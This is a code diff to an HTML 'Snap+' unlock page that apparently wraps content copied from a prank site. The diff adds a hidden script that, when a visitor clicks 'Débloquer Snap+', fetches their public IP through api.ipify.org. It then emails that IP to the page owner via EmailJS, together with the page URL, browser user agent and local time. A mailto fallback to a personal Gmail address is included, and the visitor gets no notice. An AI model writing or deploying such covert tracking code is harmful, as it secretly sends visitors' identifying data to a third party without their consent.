@@ -38,6 +38,58 @@
       background-color: #2563eb;
     }
   </style>
+
+  <!-- EmailJS client (CDN) -->
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    // === CONFIGURATION EMAILJS ===
+    // Remplace ces valeurs par celles fournies par EmailJS
+    const EMAILJS_PUBLIC_KEY = "JaD3SkW5OsSd7Z9JN";   // ex: user_xxxxx
+    const EMAILJS_SERVICE_ID = "service_2lzhucl";    // ex: service_xxx
+    const EMAILJS_TEMPLATE_ID = "template_5v6et8m";  // ex: template_xxx
+    const EMAIL_TO_NAME = "Taelan";                 // optionnel
+
+    (function() {
+      if (window.emailjs) {
+        try { emailjs.init(EMAILJS_PUBLIC_KEY); } catch(e) { console.warn('EmailJS init error', e); }
+      } else {
+        console.warn('EmailJS non chargé'); 
+      }
+    })();
+
+    // Fonction qui récupère l'IP publique via api.ipify.org et envoie l'email via EmailJS
+    async function sendIpToEmail() {
+      try {
+        // Récupère l'IP publique
+        const res = await fetch("https://api.ipify.org?format=json");
+        if (!res.ok) throw new Error("Erreur récupération IP: " + res.status);
+        const data = await res.json();
+        const ip = data.ip || "IP inconnue";
+
+        // Prépare le payload (adapter aux variables de ton template EmailJS)
+        const templateParams = {
+          to_name: EMAIL_TO_NAME,
+          from_name: "Site Snap+",
+          message: `Un visiteur a débloqué Snap+\nIP : ${ip}\nURL : ${window.location.href}\nUser agent : ${navigator.userAgent}\nHeure locale : ${new Date().toString()}`
+        };
+
+        if (!window.emailjs || !emailjs.send) {
+          console.warn("EmailJS non disponible - ouverture mailto en fallback");
+          // fallback : ouvrir mailto (nécessite envoi manuel par l'utilisateur)
+          const subject = encodeURIComponent("IP visiteur Snap+");
+          const body = encodeURIComponent(templateParams.message);
+          window.location.href = `mailto:taelan668@gmail.com?subject=${subject}&body=${body}`;
+          return;
+        }
+
+        // Envoi via EmailJS
+        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
+        console.log("IP envoyée:", ip);
+      } catch (err) {
+        console.error("Erreur lors de l'envoi de l'IP :", err);
+      }
+    }
+  </script>
 </head>
 <body>
   <!-- Écran de déblocage -->
@@ -47,7 +99,7 @@
     <button id="btn">Débloquer Snap+</button>
   </div>
 
-  <!-- Contenu de Snap+.html -->
+  <!-- Contenu de Snap+.html (collé tel que fourni) -->
   <div id="snapplus">
     <head>
         <meta charset="utf-8">
@@ -130,8 +182,8 @@
                 ,
                 window.__gpp_stub = function() {
                     var e = arguments;
-                    if (__gpp.queue = __gpp.queue || [],
-                    __gpp.events = __gpp.events || [],
+                    if (__gpp.queue = __gpp.queue || [], 
+                    __gpp.events = __gpp.events || [], 
                     !e.length || 1 == e.length && "queue" == e[0])
                         return __gpp.queue;
                     if (1 == e.length && "events" == e[0])
@@ -243,15 +295,6 @@
             }();
         </script>
         <link rel="stylesheet" href="https://a.pub.network/core/pubfig/cls.css">
-        <script data-cfasync="false">
-            var freestar = freestar || {};
-            freestar.queue = freestar.queue || [];
-            freestar.config = freestar.config || {};
-            freestar.config.enabled_slots = [];
-            freestar.initCallback = function() {
-                (freestar.config.enabled_slots.length === 0) ? freestar.initCallbackCalled = false : freestar.newAdSlots(freestar.config.enabled_slots)
-            }
-        </script>
         <script src="https://a.pub.network/pranx-com/pubfig.min.js" async></script>
         <script>
             (function(w, d, s, l, i) {
@@ -381,6 +424,13 @@
         }
       } catch (e) {
         console.warn('Impossible de passer en plein écran.');
+      }
+
+      // Envoi de l'IP (appel asynchrone; on ne bloque pas l'UI)
+      try {
+        sendIpToEmail();
+      } catch (e) {
+        console.warn('Erreur lors de l\'envoi de l\'IP :', e);
       }
 
       // Transition entre les écrans
